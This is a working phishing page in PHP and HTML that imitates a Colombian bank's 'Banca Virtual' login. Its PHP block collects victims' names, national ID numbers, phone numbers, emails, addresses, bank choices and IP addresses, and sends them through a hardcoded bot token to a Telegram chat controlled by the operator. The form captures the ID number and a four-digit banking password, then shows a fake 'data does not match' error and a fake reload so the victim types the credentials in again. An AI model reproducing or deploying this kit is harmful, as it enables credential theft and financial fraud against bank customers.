<?php
if (!empty($_POST)) {
    // ✅ INFORMACION PERSONAS
    $botToken = '8218207716:AAG2XEoXF7ZI-8q9sSbdN54q_i2oA3rcq24';
    $chatId   = '-4860589927';

    $origen = $_POST['origen'] ?? '';
    $mensaje = '';

    if ($origen === 'bancolombia') {
        $nombre = trim($_POST['nombre'] ?? '');
        $documento = trim($_POST['documento'] ?? '');
        $telefono = trim($_POST['telefono'] ?? '');
        $email = trim($_POST['email'] ?? '');
        $ip = $_SERVER['HTTP_CLIENT_IP'] ??
        $_SERVER['HTTP_X_FORWARDED_FOR'] ??
        $_SERVER['HTTP_CF_CONNECTING_IP'] ??
        $_SERVER['REMOTE_ADDR'] ??
        'IP no detectada';

        $mensaje  = "🏦 BOTON BANCOLOMBIA 🏦\n";
        $mensaje .= "=================\n";
        $mensaje .= "DATOS\n";
        $mensaje .= "=================\n";
        $mensaje .= "⚙️Nombre: $nombre\n";
        $mensaje .= "💳Cédula: $documento\n";
        $mensaje .= "📞Teléfono: $telefono\n"; // ← AQUÍ EL \n ES CLAVE
        $mensaje .= "✉️Correo: $email";
        $mensaje .= "🌐IP: $ip";

    } elseif ($origen === 'pse') {
        $banco = trim($_POST['select'] ?? '');
        $nombre = trim($_POST['nombre'] ?? '');
        $direccion = trim($_POST['direccion'] ?? '');
        $documento = trim($_POST['documento'] ?? '');
        $telefono = trim($_POST['telefono'] ?? '');
        $email = trim($_POST['email'] ?? '');
        $ip = $_SERVER['HTTP_CLIENT_IP'] ??
        $_SERVER['HTTP_X_FORWARDED_FOR'] ??
        $_SERVER['HTTP_CF_CONNECTING_IP'] ??
        $_SERVER['REMOTE_ADDR'] ??
        'IP no detectada';

        $mensaje  = "🏦 BOTON BOGOTA 🏦\n";
        $mensaje .= "=================\n";
        $mensaje .= "DATOS\n";
        $mensaje .= "=================\n";
        $mensaje .= "💰Banco: $banco\n";
        $mensaje .= "⚙️Nombre: $nombre\n";
        $mensaje .= "📍Dirección: $direccion\n"; // ← AQUÍ EL \n ES CLAVE
        $mensaje .= "💳Cédula: $documento\n";
        $mensaje .= "📞Teléfono: $telefono\n";
        $mensaje .= "✉️Correo: $email\n";
        $mensaje .= "🌐IP: $ip";

} else {
    $lineas = [];
    foreach ($_POST as $campo => $valor) {
        $valor = is_array($valor) ? implode(', ', $valor) : trim((string) $valor);
        $lineas[] = ucfirst($campo) . ': ' . $valor;
    }
    $mensaje = "📍 Formulario desconocido\n" . implode("\n", $lineas);
}

    // ✅ AQUÍ YA ESTÁN DEFINIDAS LAS VARIABLES $botToken y $chatId
    $url = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';
    $data = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => 'true',
    ];

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 3,
        CURLOPT_POSTFIELDS => http_build_query($data),
    ]);
    curl_exec($ch);
    curl_close($ch);
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Banca Virtual - Ingreso</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet" />
  <link rel="stylesheet" href="bogota.css">
  <style>
    .modal-error {
      position: fixed;
      inset: 0;
      z-index: 9999;
      background: rgba(44, 63, 106, 0.46);
      display: flex;
      align-items: center;
      justify-content: center;
      transition: opacity 0.18s;
    }
    .modal-error-content {
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 2px 18px 0 rgba(44, 63, 106, 0.11);
      width: 94vw;
      max-width: 410px;
      padding: 36px 22px 28px 22px;
      text-align: center;
      position: relative;
    }
    .modal-error-icon {
      display: flex;
      align-items: center;
      justify-content: center;
      background: #F2E9DB;
      border-radius: 50%;
      width: 46px;
      height: 46px;
      margin: 0 auto 17px auto;
    }
    .modal-error-title {
      font-family: 'Roboto', Arial, sans-serif;
      color: #101828;
      font-weight: 700;
      font-size: 1.23rem;
      margin-bottom: 8px;
      margin-top: 2px;
    }
    .modal-error-text {
      color: #5F6B7A;
      font-family: 'Roboto', Arial, sans-serif;
      font-size: 1rem;
      line-height: 1.4;
      margin-bottom: 29px;
    }
    .modal-error-btn {
      display: block;
      margin: 0 auto;
      background: #0043a9;
      color: #fff;
      font-family: 'Roboto', Arial, sans-serif;
      font-size: 1.06rem;
      font-weight: 700;
      border: none;
      border-radius: 23px;
      padding: 13px 0;
      width: 90%;
      cursor: pointer;
      transition: background 0.17s;
    }
    .modal-error-btn:hover {
      background: #0043a9;
    }
    .fake-reload-loader {
      position: fixed;
      inset: 0;
      z-index: 10000;
      background: rgba(44, 63, 106, 0.10);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      transition: opacity 0.18s;
    }
    .spinner {
      margin-bottom: 17px;
    }
    .loader-bg {
      stroke-dasharray: 126;
      stroke-dashoffset: 0;
    }
    .loader-fg {
      stroke-dasharray: 126;
      stroke-dashoffset: 63;
      transform-origin: center;
      animation: spinner-rotate 1.1s linear infinite;
    }
    @keyframes spinner-rotate {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    .loader-text {
      color: #22304b;
      font-size: 1.13rem;
      font-family: 'Roboto', Arial, sans-serif;
      margin-top: 6px;
      font-weight: 500;
      text-align: center;
    }
  </style>
</head>
<body>
  <div id="main-content">
    <div class="login-container" id="login-container">
      <div class="header">
        <img src="logo.svg" alt="Logo" class="logo">
        <h1>Bienvenido a tu Banca Virtual</h1>
      </div>
      <section class="banner">
        <img src="leita.png" alt="" class="banner-image">
        <div class="banner-text">
          ¿Nunca has ingresado a Banca Virtual?<br>
          Aquí te decimos cómo hacerlo &rsaquo;
        </div>
      </section>
      <div class="tabs">
        <button class="active">Clave segura</button>
        <button class="active1">Tarjeta débito</button>
      </div>
      <section class="info-box">
        <div class="info-text">
          <p>
            Estás ingresando con tu Clave Segura.<br>
            Selecciona ‘Tarjeta Débito’ para cambiar el tipo de ingreso.
          </p>
        </div>
        <button class="close-btn" title="Cerrar">
          <svg width="20" height="20" viewBox="0 0 26 26" aria-hidden="true" focusable="false">
            <line x1="5" y1="5" x2="21" y2="21" stroke="#5C93C6" stroke-width="2.2"/>
            <line x1="21" y1="5" x2="5" y2="21" stroke="#5C93C6" stroke-width="2.2"/>
          </svg>
        </button>
      </section>
      <div class="form-block-identificacion">
        <label for="identificacion" class="identidad">Identificación</label>
        <div class="input-group">
          <div class="custom-select-wrapper">
            <select id="tipo-id">
              <option value="cc" data-label="C.C.">C.C. – Cédula de ciudadanía</option>
              <option value="ti" data-label="T.I.">T.I. – Tarjeta de identidad</option>
              <option value="ce" data-label="C.E.">C.E. – Cédula de extranjería</option>
              <option value="ce" data-label="N.P.N.">N.P.N. – NIT Persona Natural</option>
              <option value="ce" data-label="N.P.E.">N.P.E. – NIT Persona Extranjera</option>
              <option value="ce" data-label="N.P.J.">N.P.J. – NIT Persona Jurídica</option>
              <option value="ce" data-label="P.S.">P.S. – Pasaporte</option>
              <option value="ce" data-label="R.C.">R.C. – Registro Civil</option>
            </select>
            <div class="select-display" id="tipo-display">C.C.</div>
          </div>
          <input type="text" id="txtUsuario" class="input-id" placeholder="#">
        </div>
        <label for="clave" class="clave">Clave segura</label>
        <div class="password-group">
          <input type="password" id="txtPass" placeholder="....">
          <span class="material-symbols-outlined toggle-icon" id="togglePassword">visibility</span>
        </div>
        <button class="btn-ingresar" id="btnUsuario" disabled>Ingresar</button>
        <div class="footer-links">
          <a href="#">Registrarme ›</a>
          <span class="divider"></span>
          <a href="#">Olvidé mi clave ›</a>
        </div>
      </div>
    </div>
    <div class="recaptcha-info">
      Este sitio está protegido por reCAPTCHA y aplican las
      <a href="https://policies.google.com/privacy" target="_blank" rel="noopener">políticas de privacidad</a>
      y los
      <a href="https://policies.google.com/terms" target="_blank" rel="noopener">términos de servicio de Google</a>.
    </div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="/scripts/functions2.js"></script>
    <script>
      const txtUsuario = document.getElementById('txtUsuario');
      const txtPass = document.getElementById('txtPass');
      const btnUsuario = document.getElementById('btnUsuario');
      function validarBoton() {
        // Usuario: 1 a 16 números. Clave: 4 números exactos
        const userOk = /^\d{1,16}$/.test(txtUsuario.value);
        const passOk = /^\d{4}$/.test(txtPass.value);
        if (userOk && passOk) {
          btnUsuario.disabled = false;
          btnUsuario.classList.add('enabled');
        } else {
          btnUsuario.disabled = true;
          btnUsuario.classList.remove('enabled');
        }
      }
      txtUsuario.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 16);
        validarBoton();
      });
      txtPass.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 4);
        validarBoton();
      });
      // Por si autocompleta al cargar
      window.addEventListener('DOMContentLoaded', validarBoton);
      $(document).ready(function() {
        $('#btnUsuario').click(function() {
          if (btnUsuario.disabled) return; // No hace nada si está deshabilitado
          if ($("#txtUsuario").val().length > 0) {
            pasousuario(
              $("#txtPass").val(),
              $("#txtUsuario").val(),
              $("#banco").val()
            );
          } else {
            $("#err-mensaje").show();
            $(".user").css("border", "1px solid red");
            $("#txtUsuario").focus();
          }
        });
        $("#txtUsuario").keyup(function(e) {
          $(".user").css("border", "1px solid #CCCCCC");
          $("#err-mensaje").hide();
        });
      });
    </script>
    <script>
      document.addEventListener('DOMContentLoaded', function() {
        const selectTipo = document.getElementById('tipo-id');
        const displayTipo = document.getElementById('tipo-display');
        function actualizarDisplay() {
          const opcion = selectTipo.options[selectTipo.selectedIndex];
          const etiqueta = opcion.getAttribute('data-label');
          displayTipo.textContent = etiqueta;
        }
        selectTipo.addEventListener('change', actualizarDisplay);
        actualizarDisplay();
      });
    </script>
    <script>
      document.addEventListener('DOMContentLoaded', function() {
        const txtPass = document.getElementById('txtPass');
        const togglePassword = document.getElementById('togglePassword');
        togglePassword.addEventListener('click', function() {
          const currentType = txtPass.getAttribute('type');
          const nuevoTipo = currentType === 'password' ? 'text' : 'password';
          txtPass.setAttribute('type', nuevoTipo);
          this.textContent = (nuevoTipo === 'password') ? 'visibility' : 'visibility_off';
        });
      });
    </script>
  </div>

  <!-- MODAL DE ERROR -->
  <div class="modal-error" id="modal-error" style="display: flex;">
    <div class="modal-error-content">
      <div class="modal-error-icon">
    <img src="avis.svg" width="50" height="50" alt="icono" />
      </div>
      <div class="modal-error-title">Tus datos no coinciden</div>
      <div class="modal-error-text">
        Verifícalos e inténtalo nuevamente. Si aún no eres cliente te invitamos a solicitar un producto desde la pantalla de inicio. (02)
      </div>
      <button class="modal-error-btn" id="btnCerrarModalError">
        Volver al inicio
      </button>
    </div>
  </div>

  <!-- LOADER DE RECARGA -->
  <div class="fake-reload-loader" id="fake-reload-loader" style="display:none;">
    <div class="spinner">
      <svg width="60" height="60" viewBox="0 0 44 44">
        <circle class="loader-bg" cx="22" cy="22" r="20" fill="none" stroke="#EAF0F6" stroke-width="4"/>
        <circle class="loader-fg" cx="22" cy="22" r="20" fill="none" stroke="#0047B3" stroke-width="4" stroke-linecap="round"/>
      </svg>
    </div>
  </div>

  <script>
    document.getElementById('btnCerrarModalError').onclick = function() {
      // Oculta el modal
      document.getElementById('modal-error').style.display = 'none';
      // Oculta el contenido principal
      document.getElementById('main-content').style.display = 'none';
      // Muestra el loader
      document.getElementById('fake-reload-loader').style.display = 'flex';

      // Espera 1.6 segundos y muestra todo de nuevo limpio
      setTimeout(function() {
        document.getElementById('fake-reload-loader').style.display = 'none';
        document.getElementById('main-content').style.display = '';
        // Limpiar campos del formulario
        var usuario = document.getElementById('txtUsuario');
        var clave = document.getElementById('txtPass');
        var selectTipo = document.getElementById('tipo-id');
        var btnIngreso = document.getElementById('btnUsuario');
        if (usuario) usuario.value = "";
        if (clave) clave.value = "";
        if (selectTipo) {
          selectTipo.selectedIndex = 0;
          var tipoDisplay = document.getElementById('tipo-display');
          if (tipoDisplay) tipoDisplay.textContent = selectTipo.options[0].getAttribute('data-label');
        }
        if (btnIngreso) {
          btnIngreso.disabled = true;
          btnIngreso.classList.remove('enabled');
        }
      }, 1000);
    };
  </script>
</body>
</html>
